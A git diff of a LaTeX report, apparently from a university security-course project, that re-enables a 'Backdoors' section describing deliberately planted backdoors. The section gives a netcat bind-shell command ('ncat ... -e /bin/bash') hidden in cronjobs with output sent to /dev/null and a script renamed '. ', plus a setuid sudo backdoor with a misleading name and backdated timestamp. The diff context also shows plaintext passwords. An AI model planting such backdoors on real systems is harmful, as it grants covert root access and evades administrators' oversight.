@@ -15,8 +15,9 @@
 \usepackage{enumitem}
 
 \usepackage{xifthen}
-\newboolean{showbackdoors}
-\setboolean{showbackdoors}{true}  % set to false to hide subsection on backdoors for reviewing group
+% TODO: boolean disabled because verbatim package does not work in the backdoors section. Please uncomment backdor by hand
+% \newboolean{showbackdoors}
+% \setboolean{showbackdoors}{true}  % set to false to hide subsection on backdoors for reviewing group
 
 
 \newenvironment{prettytablex}[1]{\vspace{0.3cm}\tabularx{\linewidth}{@{\hspace{\parindent}}#1@{}}}{\endtabularx\vspace{0.3cm}}
@@ -431,21 +432,22 @@ administrator, who keeps the key, has physical access to it. The machine is main
 every 20 minutes and the uWSGI/Django code and configuration files daily.
 
 
-\ifthenelse{\boolean{showbackdoors}}{
+% % Conditional removed because otherwise verbatim does not work in the backdoors section 
+% \ifthenelse{\boolean{showbackdoors}}{
 % show for handed-in version
-
-Describe the implemented backdoors.
 
 \subsection{Backdoors}
 
 \subsubsection{Easy Backdoor}
 We put the easy backdoor on the Backup machine. In certain intervals a port is opened for a short time that is directly bound to a shell. Once the attacker has access to the Backup machine he can ssh as root into all other machines from which backup data is pulled. This is possible because the backup process has root access over ssh to all machines that need to be backed up, since it needs to pull system logs readable only by root.
 
-We did this with netcat listening on port 9844 for 10 seconds:
+\noindent We did this with netcat listening on port 9844 for 10 seconds:
+\begin{verbatim}
 ncat -l 9844 -i 10 -v -e /bin/bash
-The interval scheduling is done with a few cronjobs in the crontab of user backup. To obscure those crontab entries, all their output to stdout and stderr is sent to /dev/null. Also the crontab calls a bash script instead of the netcat command, so that is looks a bit less suspicious. Finally that script is hidden with with a not so easy to find name ". ", which makes it more suspicous in the crontab entry but harder to find in general.
-The port opens in a pattern every few minutes. The pattern repeats every 10 minutes and during those opens at minute 0, 1, 3, 5, 6, 8.
+\end{verbatim}
+The interval scheduling is done with a few cronjobs in the crontab of user backup. To obscure those crontab entries, all their output to stdout and stderr is sent to /dev/null. Also the crontab calls a bash script instead of the netcat command, so that is looks a bit less suspicious. Finally, that script is hidden with a not so easy to find name ". ", which makes it more suspicious in the crontab entry but harder to find in general.
 
+The port opens in a pattern every few minutes. The pattern repeats every 10 minutes and during those opens at minute 0, 1, 3, 5, 6, 8.
 The connection is persistent if an attacker connects curing those 10 seconds when the port is open.
 
 \subsubsection{Hard Backdoor}
@@ -480,15 +482,11 @@ machine the right to execute any command without password. If it is executed wit
 files with \emph{setuid bit} set, the file is placed in a legitimate and pre-existent operating system's directory and is given a misleading name and has creation date set before the start of the semester in order to make its discovery more difficult.
 \end{itemize}
 
-
-\bigskip\noindent
-\textbf{Hide this subsection in the version handed over to the reviewing team by setting the flag \texttt{showbackdoors} at the top of this document to \texttt{false}.}
-
-
-%% do not delete the three lines below
-}{
-% empty for reviewing group's version
-}
+% % Conditional removed because otherwise verbatim does not work in the backdoors section 
+% %% do not delete the three lines below
+% }{
+% % empty for reviewing group's version
+% }
 
 \subsection{Additional Material}
 
@@ -497,7 +495,7 @@ You may have additional sections according to your needs.
 
 
 %%% MACHINE LOGIN TABLE
-\begin{table}[h]
+\begin{table}[h!]
 \centering
 \begin{tabularx}{\textwidth}{| X | X | X |}
 \hline
@@ -532,7 +530,7 @@ Webserver CA & webserver & \_web17server\_\\
 
 
 %%% SSH PRIVATE KEY TABLE
-\begin{table}[h]
+\begin{table}[h!]
 \centering
 \begin{tabularx}{\textwidth}{| X | X |}
 \hline
@@ -549,7 +547,7 @@ System Administrator & PaperW8Less\\
 
 
 %%% MQSQL DB USERS TABLE
-\begin{table}[h]
+\begin{table}[h!]
 \centering
 \begin{tabularx}{\textwidth}{| X | X |}
 \hline
@@ -568,7 +566,7 @@ dbuser & securePwd17!\\
 
 
 %%% IMOVIES PASSWORDS
-\begin{table}[h]
+\begin{table}[h!]
 \centering
 \begin{tabularx}{\textwidth}{| X | X |}
 \hline
